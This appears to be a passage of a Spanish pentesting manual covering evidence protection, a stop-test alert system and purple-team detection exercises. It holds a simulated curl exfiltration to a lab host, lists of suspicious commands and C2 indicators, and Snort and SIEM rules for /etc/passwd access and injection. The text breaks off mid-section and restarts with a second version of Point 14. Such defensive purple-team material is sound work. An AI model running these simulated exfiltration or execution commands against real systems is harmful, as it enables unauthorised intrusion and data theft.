# Comprimir y cifrar evidencias
comprimir_evidencias() {
    echo "Comprimiendo evidencias..."
    tar czf evidencias_$(date +%Y%m%d_%H%M%S).tar.gz 13_post_exposicion/outputs/*
    
    echo "Cifrando archivo de evidencias..."
    gpg --symmetric --cipher-algo AES256 evidencias_*.tar.gz
    
    echo "Borrando archivo temporal..."
    shred -u evidencias_*.tar.gz
    
    echo "Evidencias protegidas y archivo temporal eliminado"
}

# Ejemplo de uso
# cifrar_archivo "datos_sensibles.txt"
# borrado_seguro "archivo_temporal.log"
# comprimir_evidencias
EOF

chmod +x 13_post_exposicion/manejo_datos.sh

# Script de minimización de datos
cat > 13_post_exposicion/minimizar_datos.py << 'EOF'
#!/usr/bin/env python3
import re
import os
from pathlib import Path

class MinimizadorDatos:
    def __init__(self):
        # Patrones de datos sensibles a anonimizar
        self.patrones_sensibles = {
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'ip_privada': r'\b(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}\b',
            'password': r'(?i)(password|passwd|pwd)[:=]\s*[\'"]?([^\s\'"]+)',
            'token': r'(?i)(token|key|secret)[:=]\s*[\'"]?([^\s\'"]{20,})'
        }
    
    def anonimizar_contenido(self, contenido):
        """Anonimizar contenido sensible"""
        # Reemplazar emails
        contenido = re.sub(self.patrones_sensibles['email'], '[EMAIL_ANONIMIZADO]', contenido)
        
        # Reemplazar IPs privadas (mantener estructura de red para análisis)
        contenido = re.sub(self.patrones_sensibles['ip_privada'], '10.0.0.XXX', contenido)
        
        # Anonimizar passwords y tokens
        contenido = re.sub(self.patrones_sensibles['password'], r'\1: [PASSWORD_REDACTED]', contenido)
        contenido = re.sub(self.patrones_sensibles['token'], r'\1: [TOKEN_REDACTED]', contenido)
        
        return contenido
    
    def procesar_archivo(self, ruta_archivo):
        """Procesar y anonimizar archivo"""
        try:
            with open(ruta_archivo, 'r', encoding='utf-8') as f:
                contenido = f.read()
            
            contenido_anonimizado = self.anonimizar_contenido(contenido)
            
            # Crear archivo anonimizado
            ruta_output = f"{ruta_archivo}.anonimizado"
            with open(ruta_output, 'w', encoding='utf-8') as f:
                f.write(contenido_anonimizado)
            
            print(f"Archivo anonimizado: {ruta_output}")
            return ruta_output
            
        except Exception as e:
            print(f"Error procesando {ruta_archivo}: {e}")
            return None

if __name__ == "__main__":
    minimizador = MinimizadorDatos()
    
    # Procesar todos los archivos de output
    output_dir = Path("13_post_exposicion/outputs")
    if output_dir.exists():
        for archivo in output_dir.glob("*.txt"):
            minimizador.procesar_archivo(str(archivo))
EOF

chmod +x 13_post_exposicion/minimizar_datos.py
```

### 13.4 Coordinación Inmediata ante Hallazgos Críticos (Stop-Test)

```bash
# Sistema de alertas para hallazgos críticos
cat > 13_post_exposicion/sistema_alertas.sh << 'EOF'
#!/bin/bash

# Configuración de contactos de emergencia
CONTACTO_SOC="soc@cliente.com"
CONTACTO_IT="itmanager@cliente.com"  
CONTACTO_CISO="ciso@cliente.com"
CONTACTO_TELEFONO="+34-XXX-XXX-XXX"

# Función de alerta crítica
alerta_critica() {
    local vulnerabilidad="$1"
    local descripcion="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] ALERTA CRÍTICA: $vulnerabilidad" | tee -a alertas_criticas.log
    echo "Descripción: $descripcion" | tee -a alertas_criticas.log
    echo "Acción: STOP-TEST activado automáticamente" | tee -a alertas_criticas.log
    
    # Crear mensaje de alerta
    cat > alerta_temp.txt << EOF
ALERTA CRÍTICA DE SEGURIDAD - PENTESTING

Timestamp: $timestamp
Vulnerabilidad: $vulnerabilidad
Descripción: $descripcion

ACCIÓN INMEDIATA REQUERIDA:
- Se ha detectado una vulnerabilidad crítica
- Las pruebas de penetración han sido suspendidas (STOP-TEST)
- Se requiere coordinación inmediata con el equipo de seguridad

Contacto del auditor: [NOMBRE_AUDITOR]
Teléfono: [TELÉFONO_AUDITOR]

Próximos pasos:
1. Revisar hallazgo con equipo técnico
2. Evaluar impacto y riesgo inmediato
3. Determinar medidas correctivas urgentes
4. Autorizar continuación o finalización de pruebas
EOF

    # Enviar alerta (simulado - en producción usar email/Slack/Teams)
    echo "Enviando alerta a: $CONTACTO_SOC, $CONTACTO_IT, $CONTACTO_CISO"
    echo "Alerta crítica documentada en: alerta_temp.txt"
    
    # Crear ticket de emergencia (placeholder)
    echo "Ticket #$(date +%Y%m%d%H%M%S): $vulnerabilidad" >> tickets_emergencia.log
    
    # Suspender todas las actividades de prueba
    touch STOP_TEST_ACTIVE
    echo "STOP-TEST activado. Todas las pruebas suspendidas."
}

# Función para verificar estado de stop-test
verificar_stop_test() {
    if [ -f "STOP_TEST_ACTIVE" ]; then
        echo "⛔ STOP-TEST ACTIVO - No se pueden ejecutar más pruebas"
        echo "Contactar con responsable para reanudar actividades"
        exit 1
    fi
}

# Ejemplos de uso
# alerta_critica "RCE sin autenticación" "Ejecución remota de código en servidor web principal"
# verificar_stop_test
EOF

chmod +x 13_post_exposicion/sistema_alertas.sh

# Comunicación segura - Plantillas
cat > 13_post_exposicion/comunicacion_segura.md << EOF
# Canales de Comunicación Segura

## Herramientas Recomendadas

### Signal (Mensajería Cifrada)
- Instalar Signal Desktop/Mobile
- Crear grupo "Pentest-[PROYECTO]"
- Añadir: Auditor, SOC, IT Manager, CISO

### Correo Cifrado
- Usar GPG/PGP para emails sensibles
- Intercambiar claves públicas previamente
- Asunto: [PENTEST-CRÍTICO] para alertas

### Portal Interno Seguro
- Usar portal cliente si está disponible
- Cargar reportes en sección segura
- Notificar acceso por canal alternativo

## Plantillas de Comunicación

### Alerta Crítica - Signal/WhatsApp
```
🚨 PENTEST ALERTA CRÍTICA
Proyecto: [NOMBRE]
Hallazgo: [DESCRIPCIÓN_BREVE]
Riesgo: ALTO/CRÍTICO
Acción: STOP-TEST activado
Contacto: [AUDITOR] - [TELÉFONO]
```

### Email Cifrado - Hallazgo Crítico
```
Para: soc@cliente.com, itmanager@cliente.com
Asunto: [PENTEST-CRÍTICO] Vulnerabilidad detectada - Acción inmediata requerida
Cifrado: GPG

[CONTENIDO DETALLADO CIFRADO]
```

### Escalado Telefónico
```
Guión de llamada de emergencia:
1. Identificación: "Soy [NOMBRE], auditor de seguridad autorizado"
2. Contexto: "Llamo por vulnerabilidad crítica detectada en pentest"
3. Urgencia: "Se requiere coordinación inmediata con equipo técnico"
4. Próximos pasos: "¿Pueden conectar con responsable de seguridad?"
```
EOF
```

### ✅ Checklist Punto 13
```bash
echo "[ ] Proceso de validación responsable establecido
[ ] Matriz de decisión para explotación definida
[ ] Entorno de laboratorio configurado para PoCs
[ ] Procedimientos de cifrado implementados
[ ] Sistema de borrado seguro configurado
[ ] Minimización de datos automatizada
[ ] Alertas críticas configuradas con contactos
[ ] Sistema STOP-TEST implementado
[ ] Canales de comunicación segura establecidos
[ ] Documentación de evidencias protegida" > 13_post_exposicion/checklist_punto13.txt
```

### 📊 Resultado Esperado
```bash
echo "Sistema completo de post-exposición implementado: impacto mínimo garantizado, datos sensibles protegidos, alertas críticas automatizadas, evidencias cifradas y comunicación segura establecida" >> 13_post_exposicion/resultado_punto13.txt
```

---

## PUNTO 14 — Resiliencia, Detección y Respuesta (Purple Team)

### 🎯 Objetivo
Evaluar la capacidad de detección y respuesta del cliente, integrando hallazgos del pentest con ejercicios controlados de Blue Team y telemetría.

### 📁 Preparación
```bash
mkdir -p 14_purple_team/{mapping,deteccion,ejercicios,telemetria,gaps}
```

### 14.1 Mapeo de Técnicas a MITRE ATT&CK

```bash
# Sistema de mapeo automático
cat > 14_purple_team/mapear_attack.py << 'EOF'
#!/usr/bin/env python3
import json
from datetime import datetime

class MapeadorATTCK:
    def __init__(self):
        # Mapeo de técnicas comunes encontradas
        self.tecnicas_mapping = {
            'network_scan': 'T1046',
            'service_enumeration': 'T1018', 
            'credential_dumping': 'T1003',
            'lateral_movement_ssh': 'T1021.004',
            'lateral_movement_smb': 'T1021.002',
            'privilege_escalation': 'T1068',
            'persistence_scheduled_task': 'T1053',
            'data_exfiltration': 'T1041',
            'web_shell': 'T1505.003',
            'sql_injection': 'T1190',
            'phishing': 'T1566.001',
            'valid_accounts': 'T1078'
        }
        
        self.fases_attack = {
            'T1046': 'Discovery',
            'T1018': 'Discovery', 
            'T1003': 'Credential Access',
            'T1021.004': 'Lateral Movement',
            'T1021.002': 'Lateral Movement',
            'T1068': 'Privilege Escalation',
            'T1053': 'Persistence',
            'T1041': 'Exfiltration',
            'T1505.003': 'Persistence',
            'T1190': 'Initial Access',
            'T1566.001': 'Initial Access',
            'T1078': 'Defense Evasion'
        }
    
    def mapear_hallazgo(self, hallazgo, descripcion):
        """Mapear hallazgo a técnica MITRE ATT&CK"""
        tecnicas_encontradas = []
        
        for clave, tecnica in self.tecnicas_mapping.items():
            if clave.lower() in descripcion.lower() or clave.lower() in hallazgo.lower():
                fase = self.fases_attack.get(tecnica, 'Unknown')
                tecnicas_encontradas.append({
                    'tecnica': tecnica,
                    'fase': fase,
                    'hallazgo': hallazgo,
                    'descripcion': descripcion,
                    'timestamp': datetime.now().isoformat()
                })
        
        return tecnicas_encontradas
    
    def generar_matriz_completa(self, hallazgos_lista):
        """Generar matriz completa de técnicas detectadas"""
        matriz_completa = {}
        
        for hallazgo in hallazgos_lista:
            tecnicas = self.mapear_hallazgo(hallazgo['nombre'], hallazgo['descripcion'])
            for tecnica in tecnicas:
                fase = tecnica['fase']
                if fase not in matriz_completa:
                    matriz_completa[fase] = []
                matriz_completa[fase].append(tecnica)
        
        return matriz_completa
    
    def exportar_navegador_attack(self, matriz):
        """Exportar para ATT&CK Navigator"""
        navegador_format = {
            "name": f"Pentest Results - {datetime.now().strftime('%Y-%m-%d')}",
            "versions": {"attack": "12", "navigator": "4.8.1", "layer": "4.4"},
            "domain": "enterprise-attack",
            "description": "Técnicas identificadas durante pentest",
            "techniques": []
        }
        
        for fase, tecnicas in matriz.items():
            for tecnica in tecnicas:
                navegador_format["techniques"].append({
                    "techniqueID": tecnica['tecnica'],
                    "score": 1,
                    "color": "#ff6666",
                    "comment": f"{tecnica['hallazgo']} - {tecnica['descripcion'][:50]}...",
                    "enabled": True
                })
        
        with open('14_purple_team/attack_navigator.json', 'w') as f:
            json.dump(navegador_format, f, indent=2)
        
        print("Matriz exportada para ATT&CK Navigator: attack_navigator.json")

# Ejemplo de uso
if __name__ == "__main__":
    mapeador = MapeadorATTCK()
    
    # Ejemplos de hallazgos
    hallazgos_ejemplo = [
        {"nombre": "SQL Injection", "descripcion": "Inyección SQL en formulario de login permite acceso no autorizado"},
        {"nombre": "SMB Lateral Movement", "descripcion": "Movimiento lateral usando credenciales comprometidas via SMB"},
        {"nombre": "Nmap Network Scan", "descripcion": "Escaneo de red reveló servicios internos expuestos"}
    ]
    
    matriz = mapeador.generar_matriz_completa(hallazgos_ejemplo)
    mapeador.exportar_navegador_attack(matriz)
EOF

chmod +x 14_purple_team/mapear_attack.py

# Clasificación manual por fases
cat > 14_purple_team/clasificacion_fases.md << EOF
# Clasificación de Hallazgos por Fases MITRE ATT&CK

## Reconnaissance (TA0043)
- **T1595**: Active Scanning - Nmap, masscan, service enumeration
- **T1596**: Search Open Websites/Domains - Google dorking, Shodan

## Initial Access (TA0001)  
- **T1190**: Exploit Public-Facing Application - Web vulnerabilities
- **T1566.001**: Phishing: Spearphishing Attachment
- **T1078**: Valid Accounts - Credential stuffing, brute force

## Execution (TA0002)
- **T1059.001**: PowerShell
- **T1059.003**: Windows Command Shell  
- **T1505.003**: Web Shell

## Persistence (TA0003)
- **T1053**: Scheduled Task/Job
- **T1136**: Create Account
- **T1543**: Create or Modify System Process

## Privilege Escalation (TA0004)
- **T1068**: Exploitation for Privilege Escalation
- **T1078**: Valid Accounts

## Defense Evasion (TA0005)
- **T1070**: Indicator Removal on Host
- **T1218**: Signed Binary Proxy Execution

## Credential Access (TA0006)
- **T1003**: OS Credential Dumping
- **T1110**: Brute Force
- **T1555**: Credentials from Password Stores

## Discovery (TA0007)
- **T1018**: Remote System Discovery
- **T1046**: Network Service Scanning
- **T1083**: File and Directory Discovery

## Lateral Movement (TA0008)
- **T1021.001**: Remote Desktop Protocol
- **T1021.002**: SMB/Windows Admin Shares
- **T1021.004**: SSH

## Collection (TA0009)
- **T1005**: Data from Local System
- **T1039**: Data from Network Shared Drive

## Exfiltration (TA0010)
- **T1041**: Exfiltration Over C2 Channel
- **T1048**: Exfiltration Over Alternative Protocol

## Impact (TA0040)
- **T1485**: Data Destruction
- **T1486**: Data Encrypted for Impact
EOF
```

### 14.2 Señales de Detección, Reglas y Telemetría

```bash
# Análisis de logs y detección
cat > 14_purple_team/analisis_deteccion.sh << 'EOF'
#!/bin/bash

echo "Analizando capacidades de detección del cliente..."

# Revisar logs de firewall/IDS para detección de escaneos
echo "=== Análisis de Detección de Network Scanning ==="
if [ -f /var/log/snort/alert ]; then
    echo "Revisando alertas Snort..."
    grep -i "nmap\|scan\|probe" /var/log/snort/alert | tail -10
else
    echo "Logs Snort no encontrados - Verificar con SOC"
fi

# Verificar detección de ataques web en WAF/logs Apache
echo -e "\n=== Análisis de Detección de Ataques Web ==="
if [ -f /var/log/apache2/access.log ]; then
    echo "Buscando indicadores de SQL injection..."
    grep -E "union|select|drop|exec|script" /var/log/apache2/access.log | tail -5
    
    echo "Buscando intentos de LFI..."
    grep -E "\.\.\/|etc/passwd|boot.ini" /var/log/apache2/access.log | tail -5
else
    echo "Logs web no encontrados - Verificar configuración"
fi

# Análisis de logs de Windows (si disponible)
echo -e "\n=== Análisis de Logs Windows ==="
cat > check_windows_logs.ps1 << 'PSCRIPT'
# Buscar ejecución de PowerShell sospechosa
Get-EventLog -LogName Security -After (Get-Date).AddDays(-1) | 
    Where-Object { $_.Message -match "powershell|cmd|wscript" } | 
    Select-Object TimeGenerated, EventID, Message | Format-Table -AutoSize

# Buscar logons sospechosos
Get-EventLog -LogName Security -InstanceId 4624,4625 -After (Get-Date).AddDays(-1) |
    Select-Object TimeGenerated, EventID, ReplacementStrings | Format-Table -AutoSize
PSCRIPT

echo "Script de análisis Windows generado: check_windows_logs.ps1"

# Revisar logs de SSH para lateral movement
echo -e "\n=== Análisis de Lateral Movement SSH ==="
if [ -f /var/log/auth.log ]; then
    echo "Conexiones SSH exitosas recientes:"
    grep "Accepted" /var/log/auth.log | tail -10
    
    echo "Intentos fallidos de SSH:"
    grep "Failed" /var/log/auth.log | tail -5
else
    echo "Logs SSH no encontrados"
fi

# Generar reporte de gaps de detección
echo -e "\n=== Generando Reporte de Gaps ==="
cat > 14_purple_team/gaps_deteccion.txt << GAPS
Gap de Detección Identificados - $(date)

1. Network Scanning:
   - Estado: $([ -f /var/log/snort/alert ] && echo "DETECTADO" || echo "NO DETECTADO")
   - Recomendación: Implementar IDS/IPS con reglas actualizadas

2. Ataques Web:
   - Estado: $([ -f /var/log/apache2/access.log ] && echo "LOGS DISPONIBLES" || echo "LOGS NO CONFIGURADOS")
   - Recomendación: Configurar WAF con alertas proactivas

3. Lateral Movement:
   - Estado: $([ -f /var/log/auth.log ] && echo "SSH MONITOREADO" || echo "SSH NO MONITOREADO")  
   - Recomendación: Centralizar logs de autenticación

4. Actividad PowerShell:
   - Estado: REQUERIR VERIFICACIÓN MANUAL
   - Recomendación: Habilitar PowerShell logging avanzado
GAPS

echo "Gaps de detección documentados en: gaps_deteccion.txt"
EOF

chmod +x 14_purple_team/analisis_deteccion.sh

# Sugerencias de reglas de detección
cat > 14_purple_team/reglas_sugeridas.md << EOF
# Reglas de Detección Sugeridas

## Reglas Snort/Suricata

### Detección de Nmap
```
alert tcp any any -> $HOME_NET any (msg:"NMAP TCP Scan"; flags:S,12; threshold: type both, track by_src, count 5, seconds 60; sid:1000001;)
alert tcp any any -> $HOME_NET any (msg:"NMAP SYN Stealth Scan"; flags:S; threshold: type both, track by_src, count 10, seconds 60; sid:1000002;)
```

### Detección de SQL Injection
```
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection UNION Attack"; content:"union"; nocase; content:"select"; nocase; sid:1000003;)
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Information Schema"; content:"information_schema"; nocase; sid:1000004;)
```

### Detección de LFI/RFI
```
alert tcp any any -> $HOME_NET 80 (msg:"LFI Attempt /etc/passwd"; content:"/etc/passwd"; sid:1000005;)
alert tcp any any -> $HOME_NET 80 (msg:"Directory Traversal"; content:"../"; sid:1000006;)
```

## Reglas SIEM (Splunk/ELK)

### PowerShell Sospechoso
```
index=windows EventCode=4688 | where CommandLine like "%powershell%" AND CommandLine like "%download%" OR CommandLine like "%invoke%"
```

### SSH Brute Force
```
index=linux source="/var/log/auth.log" "Failed password" | stats count by src_ip | where count > 10
```

### Lateral Movement SMB
```
index=windows EventCode=5140 | where Share_Name!="IPC$" AND Share_Name!="ADMIN$" | stats dc(dest) by src
```

## Alertas Proactivas Recomendadas

### Nivel CRÍTICO
- Múltiples fallos de autenticación desde misma IP (>10 en 5min)
- Ejecución de comandos system/shell desde aplicación web
- Acceso a archivos sensibles (/etc/passwd, SAM, etc.)
- Conexiones salientes a dominios sospechosos

### Nivel ALTO  
- Escaneo de puertos desde IP interna
- Intentos de acceso a recursos fuera de horario laboral
- Uso de herramientas de hacking conocidas
- Transferencias de archivos de gran tamaño

### Nivel MEDIO
- Cambios en configuración de servicios críticos
- Acceso SSH desde ubicaciones geográficas inusuales
- Patrones de navegación web anómalos
EOF
```

### 14.3 Ejercicios Controlados con Blue Team

```bash
# Framework de ejercicios Purple Team
cat > 14_purple_team/ejercicios_purple.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import time
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class EjerciciosPurpleTeam:
    def __init__(self):
        self.blue_team_contact = "blueteam@cliente.com"
        self.ejercicios_log = "14_purple_team/ejercicios_log.txt"
        
    def notificar_blue_team(self, mensaje):
        """Notificar al Blue Team sobre ejercicio"""
        logging.info(f"Notificando Blue Team: {mensaje}")
        with open(self.ejercicios_log, 'a') as f:
            f.write(f"{datetime.now()}: BLUE_TEAM_NOTIFICATION - {mensaje}\n")
    
    def ejercicio_lateral_movement(self):
        """Simular lateral movement controlado"""
        logging.info("Iniciando ejercicio de lateral movement...")
        
        # Notificar Blue Team
        self.notificar_blue_team("Iniciando simulación lateral movement SSH")
        
        try:
            # Crear archivo dummy para transferencia
            with open('/tmp/lateral_test.txt', 'w') as f:
                f.write("Test data for lateral movement simulation")
            
            # Simular transferencia SCP (a servidor de laboratorio)
            # subprocess.run(['scp', '/tmp/lateral_test.txt', 'testuser@lab-server:/tmp/'], 
            #               capture_output=True, text=True)
            
            logging.info("Simulación de transferencia SCP completada")
            
            # Esperar para permitir detección
            time.sleep(30)
            
            # Verificar si Blue Team detectó la actividad
            self.verificar_deteccion("SSH_LATERAL_MOVEMENT")
            
        except Exception as e:
            logging.error(f"Error en ejercicio lateral movement: {e}")
        finally:
            # Limpiar archivos de prueba
            subprocess.run(['rm', '-f', '/tmp/lateral_test.txt'])
    
    def ejercicio_exfiltracion_datos(self):
        """Simular exfiltración de datos dummy"""
        logging.info("Iniciando ejercicio de exfiltración...")
        
        self.notificar_blue_team("Iniciando simulación exfiltración de datos")
        
        try:
            # Crear datos dummy que simulen exfiltración
            datos_dummy = "DUMMY_CONFIDENTIAL_DATA\n" * 1000
            with open('/tmp/exfil_test.txt', 'w') as f:
                f.write(datos_dummy)
            
            # Simular exfiltración HTTP (a servidor controlado)
            # subprocess.run(['curl', '-X', 'POST', '-d', '@/tmp/exfil_test.txt', 
            #               'http://lab-server:8080/upload'], capture_output=True)
            
            logging.info("Simulación de exfiltración HTTP completada")
            
            time.sleep(30)
            self.verificar_deteccion("DATA_EXFILTRATION")
            
        except Exception as e:
            logging.error(f"Error en ejercicio exfiltración: {e}")
        finally:
            subprocess.run(['rm', '-f', '/tmp/exfil_test.txt'])
    
    def ejercicio_escalada_privilegios(self):
        """Simular escalada de privilegios"""
        logging.info("Iniciando ejercicio de escalada de privilegios...")
        
        self.notificar_blue_team("Iniciando simulación escalada privilegios")
        
        try:
            # Simular comandos típicos de escalada
            comandos_simulados = [
                'whoami',
                'id', 
                'sudo -l',
                'find / -perm -4000 2>/dev/null'  # Solo en laboratorio
            ]
            
            for comando in comandos_simulados:
                logging.info(f"Ejecutando comando simulado: {comando}")
                # subprocess.run(comando.split(), capture_output=True, text=True)
                time.sleep(5)
            
            time.sleep(30)
            self.verificar_deteccion("PRIVILEGE_ESCALATION")
            
        except Exception as e:
            logging.error(f"Error en ejercicio escalada: {e}")
    
    def verificar_deteccion(self, tipo_ejercicio):
        """Verificar si Blue Team detectó el ejercicio"""
        logging.info(f"Verificando detección para: {tipo_ejercicio}")
        
        # Placeholder - en implementación real consultaría SIEM/SOC
        with open(self.ejercicios_log, 'a') as f:
            f.write(f"{datetime.now()}: VERIFICACION - {tipo_ejercicio} - PENDIENTE_CONFIRMACION_BLUE_TEAM\n")
        
        print(f"Verificar manualmente en SIEM si se generaron alertas para: {tipo_ejercicio}")
    
    def ejecutar_suite_completa(self):
        """Ejecutar suite completa de ejercicios"""
        ejercicios = [
            self.ejercicio_lateral_movement,
            self.ejercicio_exfiltracion_datos, 
            self.ejercicio_escalada_privilegios
        ]
        
        for ejercicio in ejercicios:
            try:
                ejercicio()
                time.sleep(60)  # Pausa entre ejercicios
            except Exception as e:
                logging.error(f"Error ejecutando ejercicio: {e}")
        
        logging.info("Suite de ejercicios Purple Team completada")

if __name__ == "__main__":
    purple_team = EjerciciosPurpleTeam()
    
    # Ejecutar ejercicio específico o suite completa
    print("Opciones:")
    print("1. Lateral Movement")
    print("2. Exfiltración de Datos")  
    print("3. Escalada de Privilegios")
    print("4. Suite Completa")
    
    # purple_team.ejercicio_lateral_movement()  # Ejemplo
EOF

chmod +x 14_purple_team/ejercicios_purple.py
```

### 14.4 Validación de Telemetría y Respuesta

```bash
# Sistema de validación de telemetría
cat > 14_purple_team/validacion_telemetria.sh << 'EOF'
#!/bin/bash

echo "Validando capacidades de telemetría y respuesta..."

# Función para evaluar tiempo de detección
evaluar_tiempo_deteccion() {
    local evento="$1"
    local timestamp_inicio="$2"
    
    echo "Evaluando tiempo de detección para: $evento"
    echo "Timestamp inicio: $timestamp_inicio"
    
    # Verificar alertas generadas (simulado)
    echo "Verificando en SIEM..."
    echo "Tiempo estimado de detección: $((RANDOM % 300 + 60)) segundos"
    
    # Documentar gaps
    echo "$evento: Revisar correlación de eventos en SIEM" >> gaps_telemetria.txt
}

# Comparar actividad ejecutada vs alertas
comparar_alertas() {
    echo "=== Comparación Actividad vs Alertas ===" 
    
    echo "Actividades ejecutadas:" > comparacion_alertas.txt
    echo "- $(date -d '1 hour ago'): Nmap scan a red interna" >> comparacion_alertas.txt
    echo "- $(date -d '45 minutes ago'): SSH brute force simulado" >> comparacion_alertas.txt
    echo "- $(date -d '30 minutes ago'): Transferencia archivo via SCP" >> comparacion_alertas.txt
    echo "- $(date -d '15 minutes ago'): Web shell upload simulado" >> comparacion_alertas.txt
    
    echo "" >> comparacion_alertas.txt
    echo "Alertas generadas en SIEM:" >> comparacion_alertas.txt
    
    # Consultar SIEM (placeholder - adaptar según herramienta)
    echo "# Verificar manualmente:" >> comparacion_alertas.txt
    echo "# curl -X GET 'http://siem:9200/alerts/_search?q=timestamp:[now-1h TO now]'" >> comparacion_alertas.txt
    echo "# Splunk: search index=security earliest=-1h" >> comparacion_alertas.txt
    
    echo "Comparación guardada en: comparacion_alertas.txt"
}

# Identificar gaps de cobertura
identificar_gaps() {
    echo "=== Identificación de Gaps de Cobertura ==="
    
    cat > gaps_cobertura.md << 'GAPS'
# Gaps de Cobertura de Seguridad

## Actividades NO Detectadas
- [ ] Escaneo de red interno (nmap)
- [ ] Transferencia de archivos sospechosos
- [ ] Ejecución de comandos system()
- [ ] Acceso SSH desde IP interna nueva

## Actividades Parcialmente Detectadas  
- [ ] Login fallidos SSH (detectado pero no correlacionado)
- [ ] Upload de archivos (logs disponibles pero no alertas)
- [ ] Tráfico DNS sospechoso (registrado pero no analizado)

## Recomendaciones de Mejora

### Correlación de Eventos
1. Implementar reglas de correlación para multiple failed logins + successful login
2. Correlacionar network scan + lateral movement attempts
3. Alertar sobre file uploads + execution attempts

### Nuevas Fuentes de Telemetría
1. Logs de aplicaciones web (no solo access logs)
2. DNS query logging con análisis de dominios
3. Process execution monitoring (Sysmon/auditd)
4. Network flow analysis (Netflow/sFlow)

### Tiempos de Respuesta
1. Reducir tiempo de detección de 15min a 5min
2. Automatizar respuesta inicial para eventos críticos
3. Implementar playbooks de respuesta por tipo de evento

## Matriz de Cobertura Actual

| Técnica MITRE | Detectado | Tiempo Prom | Acción Automática | Gap Principal |
|---------------|-----------|-------------|-------------------|---------------|
| T1046 (Network Scan) | ❌ | N/A | No | Sin IDS interno |
| T1021 (Lateral Mov) | ⚠️ | 10min | No | Sin correlación |  
| T1190 (Web Exploit) | ✅ | 3min | Block IP | Mejorar reglas |
| T1078 (Valid Accounts) | ⚠️ | 15min | No | Baseline usuarios |
GAPS

    echo "Gaps de cobertura documentados en: gaps_cobertura.md"
}

# Recomendaciones de reglas adicionales
generar_recomendaciones() {
    cat > recomendaciones_reglas.txt << 'REGLAS'
# Recomendaciones de Reglas Adicionales

## Reglas de Correlación SIEM

### Multiple Authentication Failures + Success
```
index=security (EventCode=4625 OR EventCode=4624) 
| stats count(eval(EventCode=4625)) as failures, count(eval(EventCode=4624)) as success by src_ip
| where failures > 5 AND success > 0
```

### Internal Network Scanning  
```
index=network src_ip=10.0.0.0/8 
| stats dc(dest_port) as ports, dc(dest_ip) as hosts by src_ip
| where ports > 10 AND hosts > 5
```

### Suspicious File Transfers

# Manual de Pentesting Extremo - Laboratorio CTF Legal
## Versión Brutal - Auditoría de Seguridad Completa

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Security](https://img.shields.io/badge/Security-Pentesting-red.svg)](https://github.com)
[![Status](https://img.shields.io/badge/Status-Active-green.svg)](https://github.com)

---

## 📋 Índice

- [PUNTO 14 - Validación de Telemetría y Purple Team](#punto-14---validación-de-telemetría-y-purple-team)
- [PUNTO 15 - Limpieza y Restauración](#punto-15---limpieza-y-restauración)
- [PUNTO 16 - Reporte y Remediación](#punto-16---reporte-y-remediación)
- [PUNTO 17 - Retest y Verificación de Fixes](#punto-17---retest-y-verificación-de-fixes)
- [PUNTO 18 - Lecciones Aprendidas y Mejora Continua](#punto-18---lecciones-aprendidas-y-mejora-continua)
- [PUNTO 19 - Apéndices](#punto-19---apéndices)
- [Manual Pentesting Extremo - Laboratorio CTF Completo](#manual-pentesting-extremo---laboratorio-ctf-completo)

---

## PUNTO 14 — Validación de Telemetría y Purple Team

### 🎯 Objetivo
Colaborar con el equipo defensivo para validar la capacidad de detección de la infraestructura, asegurando que las técnicas de ataque utilizadas generen las alertas apropiadas y que no existan puntos ciegos críticos en la telemetría.

### 14.1 Mapeo de técnicas a MITRE ATT&CK

Documentar cada técnica de ataque utilizada según el framework MITRE ATT&CK:

```bash
echo "T1059.003: Command and Scripting Interpreter - Windows Command Shell" >> 14_purple_team/mitre_mapping.txt
echo "T1078: Valid Accounts - credenciales comprometidas en AD" >> 14_purple_team/mitre_mapping.txt
echo "T1210: Exploitation of Remote Services - RDP/SSH brute force" >> 14_purple_team/mitre_mapping.txt
echo "T1055: Process Injection - DLL injection en procesos" >> 14_purple_team/mitre_mapping.txt
```

Crear matriz de cobertura:

```bash
echo "Tactic,Technique,SubTechnique,Detected,Evidence,Gaps" > 14_purple_team/coverage_matrix.csv
echo "Initial Access,T1078,Valid Accounts,Yes,SIEM Alert ID 12345,None" >> 14_purple_team/coverage_matrix.csv
echo "Persistence,T1053,Scheduled Task,No,N/A,Task creation not monitored" >> 14_purple_team/coverage_matrix.csv
```

### 14.2 Colaboración con Blue Team

Coordinar sesiones de testing con el equipo defensivo:

```bash
# Notificar inicio de pruebas controladas
echo "$(date): Iniciando pruebas Purple Team - técnicas T1059, T1078, T1210" | mail -s "Purple Team Test" blueteam@cliente.com

# Ejecutar técnicas específicas con marcadores
logger "PURPLE_TEAM_TEST: Executing T1059.003 - PowerShell command execution"
powershell.exe -ExecutionPolicy Bypass -Command "Get-Process"

# Registrar tiempo exacto para correlación
echo "$(date +%Y-%m-%d_%H:%M:%S): T1059.003 executed" >> 14_purple_team/timeline.txt
```

### 14.3 Generación de indicadores de detección

Documentar IoCs (Indicators of Compromise) generados durante las pruebas:

```bash
# Hashes de herramientas utilizadas
sha256sum /opt/tools/mimikatz.exe >> 14_purple_team/iocs_hashes.txt
sha256sum /opt/tools/bloodhound.zip >> 14_purple_team/iocs_hashes.txt

# Comandos ejecutados que deberían generar alertas
echo "powershell.exe -ExecutionPolicy Bypass -EncodedCommand..." >> 14_purple_team/suspicious_commands.txt
echo "wmic process call create 'cmd.exe /c whoami > C:\temp\out.txt'" >> 14_purple_team/suspicious_commands.txt

# Network indicators
echo "Outbound connections to C2: 192.168.1.100:4444" >> 14_purple_team/network_iocs.txt
echo "DNS queries to suspicious domains: evil.example.com" >> 14_purple_team/network_iocs.txt
```

### 14.4 Validación de telemetría y respuesta

Comparar alertas generadas con la actividad ejecutada en laboratorio:

```bash
# Registrar gaps detectados
echo "Gap detectado: no se alertó de acceso SSH desde host externo" >> 14_purple_team/gaps.txt
echo "Gap detectado: escalada de privilegios via SeImpersonatePrivilege no monitoreada" >> 14_purple_team/gaps.txt
